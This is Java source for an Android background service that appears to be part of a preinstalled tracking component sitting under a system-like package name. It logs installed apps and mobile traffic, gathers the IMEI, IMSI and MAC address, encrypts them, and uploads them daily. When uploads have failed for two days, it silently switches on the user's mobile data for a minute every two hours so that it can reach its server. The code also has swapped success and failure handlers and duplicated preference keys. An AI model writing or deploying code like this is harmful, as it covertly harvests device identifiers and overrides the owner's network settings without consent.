package com.android.upload;

import java.io.IOException;
import java.io.InputStream;
import java.security.InvalidKeyException;
import java.util.HashMap;
import java.util.Map;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.TrafficStats;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.telephony.TelephonyManager;

import com.android.db.APKInfo;
import com.android.db.DBManager;
import com.android.util.CommonUtil;
import com.android.util.LogUtil;
import com.android.util.MyCrashHandler;
import com.android.util.PreferenceUtil;
import com.android.util.Rijndael_Util;
import com.android.util.http.HttpCallback;
import com.android.util.http.HttpUtil;
import com.android.util.http.UploadThread;

public class StartService extends Service {
	private static final String tag = "StartService";
	
	//需要pc传入的参数:1、预装时间  2、每安装成功一个包就 传入包名
	private static final String PARAM_KEY_INSTALL_TIME = "install_time";
	private static final String PARAM_KEY_INSTALLED_APK = "pkg_name";
	
	public  static final String PARAM_KEY_UNINSTALLED_APK = "apk_uninstalled";
	
	private TelephonyManager tm;
	private PreferenceUtil prefUtil;
	private DBManager dbManager;
	
	public static final String meta_key_cid= "android_data_cid";
	public static final String meta_key_upload_traffic= "android_traffic_stats";
	public static final String meta_need_open_network= "need_open";
	
	private UploadThread mUploadAppThread;
	private static final String key_upload_app_success = "key_upload_app_success";
	private static final String key_upload_app_failed_count = "key_upload_app_count";
	private static final String key_upload_app_last_time = "key_upload_app_last_time";
	
	private UploadThread mUploadTrafficThread;
	private static final String key_upload_traffic_success = "key_upload_app_success";
	private static final String key_upload_traffic_failed_count = "key_upload_app_count";
	private static final String key_upload_traffic_last_time = "key_upload_app_last_time";
	
	private ConnectivityManager cm;
	private WifiManager wm;
	private AlarmManager am;
	private PendingIntent pi;
	
	private AlarmReceiver alarmReceiver = null;
	private static final String action_netwokr_timer = "aciton_nwt";
	private static final String action_netwokr_open = "aciton_nwo";
	private static final String action_netwokr_close = "aciton_nwc";
	private static final long time_looper_interval = 2*60*60*1000l;//每隔2小时尝试打开网络
	private static final long time_open_network = 1*60*1000l;//打开网络的持续时间改为1分钟
	
	MyCrashHandler crashHandler;
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		
		 // 异常处理，不需要处理时注释掉这两句即可！  
		crashHandler = MyCrashHandler.getInstance();   
        // 注册crashHandler   
        crashHandler.init(getApplicationContext()); 
		
		prefUtil = new PreferenceUtil(this);
		dbManager = new DBManager(this);
		tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		am = (AlarmManager)getSystemService(ALARM_SERVICE);
		cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
		wm = (WifiManager) getSystemService(WIFI_SERVICE);
		
		boolean openNetwork = CommonUtil.getMetaDataBoolean(this, meta_need_open_network);
		//如果不打开网络，则不注册广播
		if (!openNetwork) {
			return;
		}
		alarmReceiver = new AlarmReceiver();
		IntentFilter filter = new IntentFilter();
		filter.addAction(action_netwokr_timer);
		filter.addAction(action_netwokr_open);
		filter.addAction(action_netwokr_close);
		registerReceiver(alarmReceiver, filter);
		
		sendBroadcastWithAM(action_netwokr_timer, time_looper_interval);
	}
	
	@Override
	public void onDestroy() {
		if (alarmReceiver!=null) {
			unregisterReceiver(alarmReceiver);
		}
		super.onDestroy();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		LogUtil.log(tag, "onStartCommand!"+intent.toString()+"--"+intent.getDataString());
		
		if (intent!=null) {
			String installTime = intent.getStringExtra(PARAM_KEY_INSTALL_TIME);
			//保存预装时间
			if (installTime!=null) {
				if (installTime.length()>0) {
					LogUtil.log(tag, "installTime="+installTime);
					//保存预装时间
					prefUtil.setString(PARAM_KEY_INSTALL_TIME, installTime); 
					
					//初始化流量
					prefUtil.setLong(TrafficService.key_last_traffic, TrafficStats.getMobileRxBytes()+TrafficStats.getMobileTxBytes());
					prefUtil.setLong(TrafficService.key_traffic, 0l);
					
					//初始化上传数据，设置为 上次上传应用时间为 预装时间
					prefUtil.setString(key_upload_app_last_time, installTime);
					
				}
				return START_STICKY;
			}
			//保存预装apk信息
			String pkgName = intent.getStringExtra(PARAM_KEY_INSTALLED_APK);
			if (pkgName!=null) {
				LogUtil.log(tag, "pkgName="+pkgName);
				try {
					String versionName = CommonUtil.getVersion(this,pkgName);
					String appname =getPackageManager().getPackageInfo(pkgName, PackageManager.GET_UNINSTALLED_PACKAGES)
							.applicationInfo.loadLabel(getPackageManager()).toString();
					//是否需要启动?
					if (!dbManager.hadExsit(pkgName,versionName)) {
						APKInfo apkInfo = new APKInfo();
						apkInfo.appName = appname;
						apkInfo.pkgName = pkgName;
						apkInfo.version = versionName;
						dbManager.addApkInfo(apkInfo);
					}
				} catch (NameNotFoundException e) {
					e.printStackTrace();
				}
				
				//测试抛异常
				/*new Thread(){
					public void run() {
						try {
							Thread.sleep(5000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					};
				}.start();
				if (true) {
					throw new NullPointerException();
				}*/
				return START_STICKY;
			}
			
			//监听apk卸载
			String apkUninstall = intent.getStringExtra(PARAM_KEY_UNINSTALLED_APK);
			if (apkUninstall!=null) {
				LogUtil.log(tag, "uninstall pkgName="+apkUninstall);
				dbManager.updateUninstallTime(apkUninstall, CommonUtil.getHumanDate(System.currentTimeMillis()));
				return START_STICKY;
			}
		}
		
		
		//判断网络，上传app信息，上传流量监控信息
		LogUtil.log(tag, "check network");
		if (CommonUtil.getNetworkType(this)>=0) {
			uploadAppInfo();
			uploadTraffic();
			crashHandler.sendPreviousReportsToServer();
		}
		
		
		//请求激活信息
		return START_STICKY;
	}

	private void uploadAppInfo() {
		//需要 上传，并且保证同一时间只一个线程上传
		if(needUploadApp() && mUploadAppThread==null){
			//获取需要上传应用的信息
			Map<String, String> params = new HashMap<String, String>();
			JSONObject obj = new JSONObject();
			try {
				obj.put("app_info", dbManager.queryUploadAppInfo());
				String defaultInstallTime = CommonUtil.getHumanDate(System.currentTimeMillis());
				obj.put("install_time", prefUtil.getString(PARAM_KEY_INSTALL_TIME, defaultInstallTime));
				obj.put("cid",CommonUtil.getMetaDataString(StartService.this, meta_key_cid));
				obj.put("brand",Build.BRAND);
				obj.put("model",Build.MODEL);
				obj.put("imei",CommonUtil.getImei(tm));
				obj.put("imsi",CommonUtil.getImsi(tm));
				obj.put("mac",CommonUtil.getMac(wm));
			} catch (JSONException e2) {
				e2.printStackTrace();
			}
			String appInfo = obj.toString();
			LogUtil.log(tag, "app_info1="+appInfo);
			try {
				appInfo = Rijndael_Util.encode(Rijndael_Util.key, appInfo, 32);
			} catch (InvalidKeyException e1) {
				e1.printStackTrace();
			}
			LogUtil.log(tag, "app_info2="+appInfo);
			params.put("InstallInfo", appInfo);
			mUploadAppThread = new UploadThread(HttpUtil.URL_UPLOAD_APP,params,new HttpCallback() {
				@Override
				public void onOk(InputStream in) {
					int len ; byte[] buf = new byte[512];
					StringBuilder sb = new StringBuilder();
					try {
						while((len = in.read(buf))>0){
							sb.append(new String(buf,0,len));
						}
						LogUtil.log(tag, sb.toString());
						if ("OK".equals(sb.toString())) {
							onUploadAppSuccess();
						}else{
							onUploadAppFailed();
						}
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				@Override
				public void onError(int code, Exception e) {
					LogUtil.log(tag, "upload app failed!code="+code);
					onUploadAppFailed();
				}
			});
			mUploadAppThread.start();
		}
	}
	
	
	
	private boolean needUploadApp(){
		String lastTime = prefUtil.getString(key_upload_app_last_time, "");
		LogUtil.log(tag, "lastTime="+lastTime);
		if (lastTime.equals("") || CommonUtil.moreOneDay(lastTime)) {  
			//第一次上传数据，或者有超过一天未上传数据 返回true
			prefUtil.setBoolean(key_upload_app_success, false); //当天第一次上传，设置上传失败，失败次数设置为0
			prefUtil.setInt(key_upload_app_failed_count, 0); 
			
			return true;
		}else if (!prefUtil.getBoolean(key_upload_app_success, false) && prefUtil.getInt(key_upload_app_failed_count, 0)<=5) {
			//当天上传一直失败，并且失败次数小于5次  返回true
			return true;
		}
		return false;
	}
	
	private void onUploadAppSuccess() {
		prefUtil.setString(key_upload_app_last_time, CommonUtil.getHumanDate(System.currentTimeMillis()));
		prefUtil.setBoolean(key_upload_app_success, true);
		prefUtil.setInt(key_upload_app_failed_count, 0); //当天上传失败次数设置为0
		mUploadAppThread = null;
	}

	private void onUploadAppFailed() {
		prefUtil.setString(key_upload_app_last_time, CommonUtil.getHumanDate(System.currentTimeMillis()));
		prefUtil.setBoolean(key_upload_app_success, false);
		int count = prefUtil.getInt(key_upload_app_failed_count, 0);
		prefUtil.setInt(key_upload_app_failed_count, count+1);
		mUploadAppThread = null;
	}

	
	/**
	 * 上传app所用流量信息
	 */
	private void uploadTraffic() {
		boolean uploadTraffic = CommonUtil.getMetaDataBoolean(this, meta_key_upload_traffic);
		if (!uploadTraffic) {
			return;
		}
		
		if(needUploadTraffic() && mUploadTrafficThread==null){
			Map<String, String> params = new HashMap<String, String>();
			JSONObject obj = new JSONObject();
			try {
				obj.put("traffic_app", dbManager.queryTrafficInfo());
				obj.put("traffic_total",prefUtil.getLong(TrafficService.key_traffic, 0l));
				obj.put("cid",CommonUtil.getMetaDataString(StartService.this, meta_key_cid));
				obj.put("brand",Build.BRAND);
				obj.put("model",Build.MODEL);
				obj.put("imei",CommonUtil.getImei(tm));
				obj.put("imsi",CommonUtil.getImsi(tm));
				obj.put("mac",CommonUtil.getMac(wm));
			} catch (JSONException e2) {
				e2.printStackTrace();
			}
			String trafficInfo = obj.toString();
			LogUtil.log(tag, "traffic_info1="+trafficInfo);
			try {
				trafficInfo = Rijndael_Util.encode(Rijndael_Util.key, trafficInfo, 32);
			} catch (InvalidKeyException e1) {
				e1.printStackTrace();
			}
			LogUtil.log(tag, "traffic_info2="+trafficInfo);
			params.put("TrafficInfo", trafficInfo);
			mUploadTrafficThread = new UploadThread(HttpUtil.URL_UPLOAD_TRAFFIC,params,new HttpCallback() {
				@Override
				public void onOk(InputStream in) {
					int len ; byte[] buf = new byte[512];
					StringBuilder sb = new StringBuilder();
					try {
						while((len = in.read(buf))>0){
							sb.append(new String(buf,0,len));
						}
						LogUtil.log(tag, sb.toString());
						if ("OK".equals(sb.toString())) {
							onUploadTrafficSuccess();
						}else{
							onUploadTrafficFailed();
						}
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				@Override
				public void onError(int code, Exception e) {
					LogUtil.log(tag, "upload traffic failed!code="+code);
					onUploadTrafficFailed();
				}
			});
			mUploadTrafficThread.start();
		}
	}

	private boolean needUploadTraffic() {
		String lastTime = prefUtil.getString(key_upload_traffic_last_time, "");
		if (lastTime.equals("") || CommonUtil.moreOneDay(lastTime)) {  
			//第一次上传数据，或者有超过一天未上传数据 返回true
			prefUtil.setBoolean(key_upload_traffic_success, false); //当天第一次上传，设置上传失败，并且设置失败次数为0
			prefUtil.setInt(key_upload_traffic_failed_count, 0); 
			return true;
		}else if (!prefUtil.getBoolean(key_upload_traffic_success, false) && prefUtil.getInt(key_upload_traffic_failed_count, 0)<=5) {
			//当天上传一直失败，并且失败次数小于5次  返回true
			return true;
		}
		return false;
	}
	
	protected void onUploadTrafficFailed() {
		prefUtil.setString(key_upload_traffic_last_time, CommonUtil.getHumanDate(System.currentTimeMillis()));
		prefUtil.setBoolean(key_upload_traffic_success, true);
		prefUtil.setInt(key_upload_traffic_failed_count, 0); //当天上传失败次数设置为0
		mUploadTrafficThread = null;
	}

	protected void onUploadTrafficSuccess() {
		prefUtil.setString(key_upload_traffic_last_time, CommonUtil.getHumanDate(System.currentTimeMillis()));
		prefUtil.setBoolean(key_upload_traffic_success, false);
		int count = prefUtil.getInt(key_upload_traffic_failed_count, 0);
		prefUtil.setInt(key_upload_traffic_failed_count, count+1);
		mUploadTrafficThread = null;
	}

	

	/**
	 * 
	 * @author guorong
	 *
	 */
	
	private static final String key_open_network_time = "key_open_nwtime";
	private static final String key_open_network_count = "key_open_nwcount";
	
	class AlarmReceiver extends BroadcastReceiver{

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			LogUtil.log(tag, "action="+action);
			if (action_netwokr_timer.equals(action)) {
				sendBroadcastWithAM(action_netwokr_timer, time_looper_interval);
				
				String lastTime = prefUtil.getString(key_upload_app_last_time, "");
				if (CommonUtil.moreDays(lastTime, 2)) { //如果超过两天上次数据失败，则打开网络
					//当天打开网络的时间少于5次
					if (needOpenNetwork()) {
						if (!cm.getMobileDataEnabled()) {
							LogUtil.log(tag, "need open nw!!");
							cm.setMobileDataEnabled(true);
							prefUtil.setInt(key_open_network_count, prefUtil.getInt(key_open_network_count, 0)+1);
							//2分钟后关闭网络
							sendBroadcastWithAM(action_netwokr_close, time_open_network);
						}else{
							LogUtil.log(tag, "had open!,don't need open nw!!");
							prefUtil.setInt(key_open_network_count, 5);
						}
						prefUtil.setString(key_open_network_time, CommonUtil.getHumanDate(System.currentTimeMillis()));
					}
					
				}
			}else if (action_netwokr_open.equals(action)) {
				
			}else if (action_netwokr_close.equals(action)) {
				if (cm.getMobileDataEnabled()) {
					cm.setMobileDataEnabled(false);
				}
			}
		}
		
	}
	
	private boolean needOpenNetwork(){
		String lastTime = prefUtil.getString(key_open_network_time, "");
		if ("".equals(lastTime) || CommonUtil.moreOneDay(lastTime)) {
			//第一次打开网络，或者第2天开网络,设置打开次数为0
			prefUtil.setInt(key_open_network_count, 0); 
			
			return true;
		}else if (prefUtil.getInt(key_open_network_count, 0)<=5) {
			//当天打开网络的次数小于5次
			return true;
		}
		return false;
	}
	
	private void sendBroadcastWithAM(String action,long delayTimes){
		long start = System.currentTimeMillis();
		Intent i = new Intent(action);
		pi = PendingIntent.getBroadcast(this, 0, i,PendingIntent.FLAG_UPDATE_CURRENT);
		LogUtil.log(tag, delayTimes+" later send broadcast! action="+action);
		am.set(AlarmManager.RTC_WAKEUP, start+delayTimes,pi);
	}
}
